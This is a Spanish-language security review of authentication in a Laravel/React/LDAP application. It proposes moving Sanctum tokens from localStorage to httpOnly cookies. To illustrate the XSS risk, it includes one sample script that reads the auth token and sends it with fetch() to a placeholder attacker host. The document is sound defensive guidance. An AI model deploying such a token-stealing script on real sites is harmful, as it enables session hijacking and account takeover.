# 🔒 Análisis de Seguridad: Autenticación LDAP y Gestión de Tokens

**Sistema**: SAAC - Sistema de Acreditación y Aseguramiento de la Calidad  
**Fecha**: Enero 2026  
**Estado**: Desarrollo → Pre-Producción  
**Tecnologías**: Laravel 12 + React + LDAP + Sanctum

---

## 📋 Resumen Ejecutivo

Este documento analiza la seguridad actual del sistema de autenticación y propone mejoras críticas antes de la puesta en producción, especialmente considerando que **habrá una parte pública accesible desde Internet**.

---

## 🔍 Situación Actual (Desarrollo)

### Arquitectura de Autenticación

```mermaid
Usuario → Frontend (React) → Backend (Laravel) → LDAP (OpenLDAP)
                ↓                    ↓
         localStorage           MySQL (roles/permisos)
           + Redis (sesiones)
```

### Flujo Implementado

1. **Usuario ingresa**: `cedula` + `password`
2. **Backend valida** contra servidor LDAP (puerto 389)
3. **LDAP autentica**: ✅ o ❌
4. **Si exitoso**:
   - Backend sincroniza datos a MySQL (cedula, nombre, email)
   - ⚠️ **NO guarda password** (solo LDAP valida)
   - Genera token Sanctum (válido 24 horas)
   - Retorna: `{ user: {...}, token: "43|abc..." }`
5. **Frontend guarda** en `localStorage`:
   ```javascript
   localStorage.setItem('auth_token', token);
   localStorage.setItem('auth_user', JSON.stringify(user));
   ```

### Código Actual

**Backend - AuthController.php**
```php
// Línea 75 - Genera token y retorna en JSON body
$token = $user->createToken('auth-token', ['*'], now()->addHours(24))->plainTextToken;

return response()->json([
    'user' => $userResponse,
    'token' => $token  // ← Token visible en respuesta
]);
```

**Frontend - AuthService.ts**
```typescript
// Líneas 37-38 - Guarda en localStorage
localStorage.setItem(AUTH_TOKEN_KEY, mockToken);
localStorage.setItem(USER_DATA_KEY, JSON.stringify(user));
```

---

## ⚠️ Riesgos Identificados

### 1. Token en localStorage (Riesgo ALTO en Producción)

#### Vulnerabilidad
- ✅ **Desarrollo (red interna)**: Riesgo BAJO-MEDIO
- ❌ **Producción (parte pública)**: Riesgo ALTO-CRÍTICO

#### Vector de Ataque: XSS (Cross-Site Scripting)

Si un atacante logra inyectar JavaScript malicioso:

```javascript
// Ejemplo: Script inyectado en comentario, formulario, etc.
<script>
  // Roba el token
  const token = localStorage.getItem('auth_token');
  
  // Lo envía a servidor del atacante
  fetch('https://sitio-malicioso.com/robar', {
    method: 'POST',
    body: JSON.stringify({ token, timestamp: Date.now() })
  });
</script>
```

#### Impacto

| Escenario | Token Robado | Daño Potencial |
|-----------|--------------|----------------|
| Usuario Público | Rol limitado | Acceso a datos públicos |
| Estudiante/Profesor | Rol con permisos | Modificar evidencias propias |
| Administrador | Permisos altos | Acceso total a gestión de usuarios |
| **Superusuario** | **Permisos totales** | **Control completo del sistema** |

#### Otros Riesgos

1. **Accesibilidad desde consola**:
   ```javascript
   // Cualquiera puede ejecutar en DevTools:
   localStorage.getItem('auth_token')  // ← Token visible
   ```

2. **Persistencia indefinida**:
   - Token queda en el navegador hasta logout manual
   - Si usuario olvida cerrar sesión en PC compartida → Riesgo

3. **No hay protección CSRF**:
   - El token se envía manualmente en headers
   - Sin protección `SameSite`

---

## 🛡️ Solución Recomendada: Cookie httpOnly

### ¿Por qué Cookie httpOnly?

| Característica | localStorage | Cookie httpOnly |
|----------------|--------------|-----------------|
| Acceso desde JavaScript | ✅ Sí (vulnerable) | ❌ **No** (seguro) |
| Visible en DevTools | ✅ Sí | ⚠️ Solo en Network tab |
| Protección XSS | ❌ No | ✅ **Sí** |
| Protección CSRF | ❌ No | ✅ Con `SameSite` |
| Envío automático | ❌ Manual | ✅ **Automático** |
| Requiere HTTPS en prod | ⚠️ Recomendado | ✅ **Obligatorio** |

### Implementación Propuesta

#### Backend (Laravel)

**Archivo**: `app/Http/Controllers/AuthController.php`

```php
public function login(Request $request)
{
    // ... código existente (LDAP, sync, etc.) ...
    
    // Generar token
    $token = $user->createToken('auth-token', ['*'], now()->addHours(24))->plainTextToken;
    
    // CAMBIO: Enviar token en cookie httpOnly
    return response()->json([
        'user' => $userResponse,
        // NO enviar token en el body
    ])->cookie(
        'auth_token',               // Nombre de la cookie
        $token,                     // Valor del token
        1440,                       // 24 horas (en minutos)
        '/',                        // Path (toda la app)
        env('SESSION_DOMAIN'),      // Dominio (saac.una.ac.cr en prod)
        env('SESSION_SECURE_COOKIE', false), // true en producción (HTTPS)
        true,                       // httpOnly: NO accesible desde JS ✅
        false,                      // raw
        'strict'                    // SameSite: protege contra CSRF ✅
    );
}

public function logout(Request $request)
{
    $request->user()->tokens()->delete();
    Redis::del("session:user:{$request->user()->usuario_id}");
    
    // CAMBIO: Borrar cookie
    return response()->json(['message' => 'Logout exitoso'])
        ->cookie('auth_token', '', -1); // Expira la cookie
}
```

**Archivo**: `app/Http/Middleware/Authenticate.php`

```php
protected function authenticate($request, array $guards)
{
    // CAMBIO: Leer token desde cookie en lugar de header
    $token = $request->cookie('auth_token');
    
    if ($token) {
        // Inyectar en header para que Sanctum lo procese
        $request->headers->set('Authorization', "Bearer {$token}");
    }
    
    // Continuar con autenticación normal de Sanctum
    return parent::authenticate($request, $guards);
}
```

#### Frontend (React)

**Archivo**: `src/Services/AuthService.ts`

```typescript
export const authService = {
  loginWithCedula: async (cedula: string, password: string) => {
    const response = await fetch('http://localhost:8000/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include', // ← IMPORTANTE: Incluye cookies
      body: JSON.stringify({ cedula, password })
    });

    const data = await response.json();
    
    // CAMBIO: NO guardar token (está en cookie httpOnly)
    // Solo guardar datos del usuario (no sensibles)
    localStorage.setItem(USER_DATA_KEY, JSON.stringify(data.user));
    
    return { user: data.user };
    // NO retorna token (inaccesible desde JS)
  },

  logout: async () => {
    await fetch('http://localhost:8000/api/auth/logout', {
      method: 'POST',
      credentials: 'include' // Envía cookie automáticamente
    });
    
    localStorage.removeItem(USER_DATA_KEY);
  },

  // Todas las peticiones autenticadas
  fetchProtectedResource: async (url: string) => {
    return fetch(url, {
      credentials: 'include' // ← Cookie se envía automáticamente
    });
  }
};
```

**Archivo**: `src/Context/AuthContext.tsx`

```typescript
// CAMBIO: No necesita manejar token manualmente
useEffect(() => {
  // Solo cargar datos de usuario (no token)
  const savedUser = localStorage.getItem('auth_user');
  if (savedUser) {
    setUser(JSON.parse(savedUser));
  }
  setLoading(false);
}, []);
```

---

## 📊 Comparación: Antes vs Después

### Seguridad

| Aspecto | localStorage (Actual) | Cookie httpOnly (Propuesto) |
|---------|----------------------|----------------------------|
| **Vulnerabilidad XSS** | ❌ ALTA | ✅ Protegido |
| **Robo vía DevTools** | ❌ Fácil | ⚠️ Difícil (requiere Network intercept) |
| **Protección CSRF** | ❌ No | ✅ SameSite=strict |
| **Requiere HTTPS prod** | ⚠️ Recomendado | ✅ Obligatorio |
| **Nivel de seguridad** | 🔴 BAJO-MEDIO | 🟢 ALTO |

### Experiencia de Usuario

| Aspecto | localStorage | Cookie httpOnly |
|---------|--------------|-----------------|
| **Persistencia** | ✅ Entre sesiones | ✅ Entre sesiones |
| **Performance** | ✅ Rápido | ✅ Rápido (automático) |
| **Debugging** | ✅ Fácil (visible) | ⚠️ Requiere Network tab |
| **Compatibilidad** | ✅ Todos los navegadores | ✅ Todos los navegadores |

---

## 🚀 Plan de Implementación

### Fase 1: Desarrollo (Actual)
- ✅ LDAP funcionando
- ✅ Redis configurado
- ✅ Autenticación operativa
- ⚠️ **localStorage (temporal para desarrollo)**

### Fase 2: Pre-Producción (Antes de Salir)
1. **Backend**:
   - Modificar `AuthController::login()` para enviar cookie
   - Modificar `AuthController::logout()` para borrar cookie
   - Actualizar `Authenticate` middleware
   - Configurar `.env` con `SESSION_SECURE_COOKIE=true`

2. **Frontend**:
   - Agregar `credentials: 'include'` en todas las peticiones Axios/Fetch
   - Remover `localStorage.setItem('auth_token')`
   - Mantener solo datos de usuario (no sensibles)

3. **Testing**:
   - Probar login/logout
   - Verificar cookies en DevTools → Application → Cookies
   - Confirmar que JavaScript NO puede acceder al token

### Fase 3: Producción
- ✅ HTTPS habilitado (Let's Encrypt/Certificado UNA)
- ✅ `SESSION_SECURE_COOKIE=true` en `.env`
- ✅ `SESSION_DOMAIN=saac.una.ac.cr`
- ✅ Firewall configurado
- ✅ Monitoreo de intentos de ataque

---

## 🎯 Recomendaciones Finales

### Críticas (Antes de Producción)

1. ✅ **Implementar Cookie httpOnly** - Prioridad ALTA
2. ✅ **Habilitar HTTPS** - Obligatorio para cookies seguras
3. ✅ **Configurar CORS correctamente**:
   ```php
   // config/cors.php
   'supports_credentials' => true,
   'allowed_origins' => ['https://saac.una.ac.cr'],
   ```
4. ✅ **Validar entrada de usuarios** - Prevenir XSS en campos de texto

### Recomendadas (Mejora Continua)

1. ⚠️ **Rate Limiting agresivo** en `/api/auth/login`
2. ⚠️ **Logging de intentos fallidos** (ya implementado con AuditLogService)
3. ⚠️ **2FA opcional** para Superusuarios/Admins
4. ⚠️ **Rotación de tokens** cada 1 hora (en lugar de 24)
5. ⚠️ **Blacklist de tokens** al logout (Redis)

---

## 📞 Preguntas para la Reunión

1. **¿La parte pública permitirá contenido generado por usuarios?**
   - Formularios, comentarios, archivos → Riesgo XSS ALTO

2. **¿Cuándo está previsto el lanzamiento a producción?**
   - Cookie httpOnly debe implementarse ANTES

3. **¿Hay presupuesto para auditoría de seguridad externa?**
   - Recomendado para sistemas con datos sensibles (UNA)

4. **¿Se requerirá acceso desde dispositivos móviles?**
   - Cookie httpOnly funciona igual en apps móviles

---

## 📚 Referencias

- [OWASP Top 10 - XSS](https://owasp.org/www-project-top-ten/)
- [Laravel Sanctum - Cookie Authentication](https://laravel.com/docs/11.x/sanctum#spa-authentication)
- [MDN - HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [OWASP - Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)

---

**Preparado por**: Sistema SAAC - Equipo de Desarrollo  
**Contacto**: [Incluir email del equipo]  
**Versión**: 1.0
